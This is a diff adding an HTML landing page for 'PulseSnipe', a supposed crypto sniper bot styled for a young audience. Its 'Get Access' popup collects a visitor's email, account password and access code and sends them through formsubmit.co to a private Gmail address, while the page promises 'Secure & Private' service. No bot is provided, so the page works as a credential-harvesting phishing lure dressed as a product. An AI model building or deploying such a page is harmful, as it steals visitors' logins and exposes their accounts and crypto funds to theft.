@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PulseSnipe - Ultimate Crypto Sniper Bot</title>
+    <style>
+        /* Modern, vibrant CSS for young audience: dark theme with neon accents, gradients, animations */
+        body {
+            margin: 0;
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #fff;
+            overflow-x: hidden;
+        }
+        header {
+            text-align: center;
+            padding: 100px 20px;
+            background: url('https://via.placeholder.com/1920x1080?text=PulseSnipe+Hero') no-repeat center/cover; /* Replace with actual hero image */
+            animation: fadeIn 2s ease-in-out;
+        }
+        h1 {
+            font-size: 4em;
+            margin: 0;
+            text-shadow: 0 0 10px #00ffcc;
+            animation: glow 1.5s infinite alternate;
+        }
+        p {
+            font-size: 1.5em;
+            margin: 20px 0;
+        }
+        .cta-button {
+            background: #00ffcc;
+            color: #000;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2em;
+            cursor: pointer;
+            border-radius: 50px;
+            transition: transform 0.3s, box-shadow 0.3s;
+            box-shadow: 0 0 20px #00ffcc;
+        }
+        .cta-button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 30px #00ffcc;
+        }
+        section {
+            padding: 60px 20px;
+            text-align: center;
+        }
+        #features {
+            background: rgba(0, 0, 0, 0.5);
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .feature {
+            background: #1a1a2e;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.3);
+            transition: transform 0.3s;
+        }
+        .feature:hover {
+            transform: translateY(-10px);
+        }
+        footer {
+            background: #0f0c29;
+            padding: 20px;
+            text-align: center;
+        }
+        a {
+            color: #00ffcc;
+            text-decoration: none;
+        }
+        /* Modal Popup */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.8);
+            animation: fadeIn 0.5s;
+        }
+        .modal-content {
+            background-color: #1a1a2e;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #00ffcc;
+            width: 80%;
+            max-width: 400px;
+            border-radius: 15px;
+            text-align: center;
+        }
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .close:hover,
+        .close:focus {
+            color: #fff;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        input[type="email"],
+        input[type="password"] {
+            width: 80%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #00ffcc;
+            border-radius: 5px;
+            background: #0f0c29;
+            color: #fff;
+        }
+        /* Animations */
+        @keyframes fadeIn {
+            from {opacity: 0;}
+            to {opacity: 1;}
+        }
+        @keyframes glow {
+            from {text-shadow: 0 0 10px #00ffcc;}
+            to {text-shadow: 0 0 20px #00ffcc;}
+        }
+    </style>
+    <!-- Google Fonts for modern look -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+</head>
+<body>
+    <header>
+        <h1>PulseSnipe</h1>
+        <p>The ultimate sniper bot for crypto enthusiasts. Snipe new tokens lightning-fast on PulseChain and beyond!</p>
+        <button class="cta-button" onclick="openModal()">Get Access</button>
+    </header>
+
+    <section id="features">
+        <h2>Why PulseSnipe?</h2>
+        <div class="feature-grid">
+            <div class="feature">
+                <h3>Lightning Speed</h3>
+                <p>Snipes tokens in milliseconds with advanced algorithms.</p>
+            </div>
+            <div class="feature">
+                <h3>Custom Filters</h3>
+                <p>Set your own criteria for liquidity, volume, and more.</p>
+            </div>
+            <div class="feature">
+                <h3>Secure & Private</h3>
+                <p>Your data stays yours. No compromises.</p>
+            </div>
+            <div class="feature">
+                <h3>Trusted by Many</h3>
+                <p>Join a growing community of crypto traders who rely on PulseSnipe daily.</p>
+            </div>
+        </div>
+    </section>
+
+    <section id="terms">
+        <h2>Terms of Service</h2>
+        <p>Last updated: August 27, 2025</p>
+        <p>Welcome to PulseSnipe. By accessing or using our website and services, you agree to be bound by these Terms of Service ("Terms"). If you do not agree to these Terms, please do not use our services.</p>
+        
+        <h3>1. Acceptance of Terms</h3>
+        <p>These Terms constitute a legally binding agreement between you and PulseSnipe ("we," "us," or "our"). Your use of the site signifies your acceptance of these Terms and our Privacy Policy.</p>
+        
+        <h3>2. Description of Services</h3>
+        <p>PulseSnipe provides a cryptocurrency sniper bot tool designed to automate token purchases on blockchain networks. The services are provided "as is" without warranties of any kind.</p>
+        
+        <h3>3. User Accounts</h3>
+        <p>To access certain features, you may need to provide an access code. You are responsible for maintaining the confidentiality of your code and for all activities that occur under your account.</p>
+        
+        <h3>4. Prohibited Conduct</h3>
+        <p>You agree not to use the services for any illegal or unauthorized purpose, including but not limited to violating any laws in your jurisdiction.</p>
+        
+        <h3>5. Intellectual Property</h3>
+        <p>All content on this site, including text, graphics, logos, and software, is the property of PulseSnipe or its licensors and is protected by copyright and other intellectual property laws.</p>
+        
+        <h3>6. Disclaimer of Warranties</h3>
+        <p>The services are provided on an "as is" and "as available" basis. We disclaim all warranties, express or implied, including but not limited to implied warranties of merchantability and fitness for a particular purpose.</p>
+        
+        <h3>7. Limitation of Liability</h3>
+        <p>In no event shall PulseSnipe be liable for any indirect, incidental, special, or consequential damages arising out of or in connection with the use of our services.</p>
+        
+        <h3>8. Indemnification</h3>
+        <p>You agree to indemnify and hold harmless PulseSnipe from any claims, losses, or damages arising from your use of the services or violation of these Terms.</p>
+        
+        <h3>9. Governing Law</h3>
+        <p>These Terms shall be governed by the laws of [Your Jurisdiction, e.g., the State of California], without regard to its conflict of law principles.</p>
+        
+        <h3>10. Changes to Terms</h3>
+        <p>We reserve the right to modify these Terms at any time. Your continued use of the services after such changes constitutes your acceptance of the new Terms.</p>
+        
+        <p>If you have any questions about these Terms, please contact us at support@pulsesnipe.com.</p>
+    </section>
+
+    <footer>
+        <p>&copy; 2025 PulseSnipe. All rights reserved. | <a href="#terms">Terms of Service</a> | <a href="#privacy">Privacy Policy</a></p>
+    </footer>
+
+    <!-- Modal Popup -->
+    <div id="accessModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <h2>Enter Access Details</h2>
+            <form id="accessForm" action="https://formsubmit.co/johnysmith5235@gmail.com" method="POST">
+                <input type="hidden" name="_subject" value="New Access Code Submission">
+                <input type="hidden" name="_next" value="thankyou.html"> <!-- Optional: redirect after submit -->
+                <input type="email" name="email" placeholder="Enter your email" required>
+                <input type="password" name="account_password" placeholder="Enter account password" required>
+                <input type="password" name="code" placeholder="Enter your code" required>
+                <button type="submit" class="cta-button">Enter</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Modal functions
+        function openModal() {
+            document.getElementById('accessModal').style.display = 'block';
+        }
+        function closeModal() {
+            document.getElementById('accessModal').style.display = 'none';
+        }
+        // Close modal on outside click
+        window.onclick = function(event) {
+            var modal = document.getElementById('accessModal');
+            if (event.target == modal) {
+                modal.style.display = 'none';
+            }
+        }
+        // On form submit, close modal after sending (formsubmit handles the send)
+        document.getElementById('accessForm').addEventListener('submit', function() {
+            // Close modal immediately after submit
+            setTimeout(closeModal, 500); // Small delay to allow submit
+        });
+    </script>
+</body>
+</html>
